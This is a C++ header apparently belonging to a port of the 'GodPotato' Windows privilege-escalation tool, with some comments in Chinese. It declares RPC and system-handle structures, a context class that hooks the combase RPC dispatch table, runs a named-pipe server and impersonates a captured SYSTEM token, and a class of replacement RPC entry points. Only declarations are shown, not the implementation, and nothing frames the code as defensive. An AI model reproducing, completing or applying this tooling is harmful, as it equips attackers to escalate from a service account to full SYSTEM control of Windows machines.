#pragma once

#include <Windows.h>
#include <cstdint>
#include <string>
#include <thread>
#include <vector>
#include <functional>

// RPC related structures (layout matches the C# structures).
struct RPC_VERSION_EX
{
    uint16_t MajorVersion;
    uint16_t MinorVersion;
};

struct RPC_SYNTAX_IDENTIFIER_EX
{
    GUID SyntaxGUID;
    RPC_VERSION_EX SyntaxVersion;
};

struct RPC_SERVER_INTERFACE_EX
{
    uint32_t Length;
    RPC_SYNTAX_IDENTIFIER_EX InterfaceId;
    RPC_SYNTAX_IDENTIFIER_EX TransferSyntax;
    void* DispatchTable;
    uint32_t RpcProtseqEndpointCount;
    void* RpcProtseqEndpoint;
    void* DefaultManagerEpv;
    void* InterpreterInfo;
    uint32_t Flags;
};

struct RPC_DISPATCH_TABLE_EX
{
    uint32_t DispatchTableCount;
    void* DispatchTable;
    intptr_t Reserved;
};

struct MIDL_SERVER_INFO_EX
{
    void* pStubDesc;
    void* DispatchTable;
    void* ProcString;
    void* FmtStringOffset;
    void* ThunkTable;
    void* pTransferSyntax;
    void* nCount;
    void* pSyntaxInfo;
};

// System handle enumeration (NtQuerySystemInformation)
#pragma pack(push, 1)
struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
    void* Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTrackIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
};

struct SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
};
#pragma pack(pop)

// Runtime context for hooking and pipe impersonation.
class GodPotatoContext
{
public:
    explicit GodPotatoContext(const std::string& pipeName = "Potato");
    ~GodPotatoContext();

    void start();
    void hookRPC();
    void restore();
    void stop();
    HANDLE getToken() const;
    bool isStarted() const;
    const char* getClientPipe() const;

private:
    void initContext();
    void pipeServer();
    void impersonateSystemToken(HANDLE token);
    static bool matchesSystemImpersonationCriteria(HANDLE token);
    static std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> listSystemHandles();
    static USHORT getTokenObjectTypeIndex();
    struct ProcessToken
    {
        std::string sid;
        std::string userName;
        SECURITY_IMPERSONATION_LEVEL impersonationLevel;
        DWORD integrityLevel;
        TOKEN_ELEVATION_TYPE elevationType;
        HANDLE tokenHandle;
        DWORD targetProcessId;
        HANDLE targetProcessToken;
        bool isRestricted;
        void Close();
    };
    using ListProcessTokensCallback = std::function<bool(ProcessToken&)>;
    static std::vector<ProcessToken> listProcessTokens(int targetPid,
                                                      const ListProcessTokensCallback& callback);
    static void putToken(std::vector<ProcessToken>& list, ProcessToken& token);

    static int WINAPI customUseProtseqFunction4(void* p0, void* p1, void* p2, void* p3);
    static int WINAPI customUseProtseqFunction5(void* p0, void* p1, void* p2, void* p3, void* p4);
    static int WINAPI customUseProtseqFunction6(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5);
    static int WINAPI customUseProtseqFunction7(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6);
    static int WINAPI customUseProtseqFunction8(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7);
    static int WINAPI customUseProtseqFunction9(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8);
    static int WINAPI customUseProtseqFunction10(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9);
    static int WINAPI customUseProtseqFunction11(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10);
    static int WINAPI customUseProtseqFunction12(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11);
    static int WINAPI customUseProtseqFunction13(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12);
    static int WINAPI customUseProtseqFunction14(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12, void* p13);
    
    // 添加一个静态方法来设置当前实例上下文
    static void setCurrentInstance(GodPotatoContext* instance);
    
private:
    // 静态成员变量来保存当前实例
    static GodPotatoContext* currentInstance;

private:
    static const GUID orcbRPCGuid;
    HMODULE combaseModule;
    uintptr_t dispatchTablePtr;
    uintptr_t useProtseqFunctionPtr;
    uint32_t useProtseqFunctionParamCount;

    std::vector<uintptr_t> dispatchTable;
    std::vector<int16_t> fmtStringOffsetTable;
    uintptr_t procString;
    HMODULE hCombase;
    std::thread pipeServerThread;
    HANDLE pipeServerHandle;
    bool isStart;
    bool isHook;
    std::string pipeName;
    HANDLE systemToken;
    std::string serverPipe;
    std::string clientPipe;
};

// RPC entry points used by the dispatch table hook.
class NewOrcbRPC
{
public:
    explicit NewOrcbRPC(GodPotatoContext* context);

    int fun(void* ppdsaNewBindings, void* ppdsaNewSecurity);
    int fun4(void* p0, void* p1, void* p2, void* p3);
    int fun5(void* p0, void* p1, void* p2, void* p3, void* p4);
    int fun6(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5);
    int fun7(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6);
    int fun8(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7);
    int fun9(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8);
    int fun10(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9);
    int fun11(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10);
    int fun12(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11);
    int fun13(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12);
    int fun14(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12, void* p13);

private:
    GodPotatoContext* godPotatoContext;
};
